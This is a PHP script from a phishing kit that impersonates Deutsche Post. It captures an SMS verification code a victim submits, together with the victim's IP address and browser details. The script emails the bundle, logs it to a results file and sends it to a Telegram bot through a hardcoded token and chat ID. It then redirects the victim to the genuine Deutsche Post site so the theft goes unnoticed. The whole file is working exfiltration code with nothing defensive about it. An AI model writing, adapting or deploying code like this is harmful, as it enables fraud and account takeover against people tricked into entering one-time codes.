<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ Germany POST SMS2]-----++--\n";
$message .= "-------------- BY SPIRITO-----\n";
$message .= "SMS 2 : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------By SAAD ----------------------\n";
$subject = "Germany POST [ " . $zabi . " ]  ";
$email = " hna email";
mail($email,$subject,$message);
    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);

$token = "1310828275:AAGPNocJm7Fpq5O7J7jUGXlJMD65mRPIsoY";
$data = [
    'text' => $message,
    'chat_id' => '734601035'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: https://www.deutschepost.de/");
?>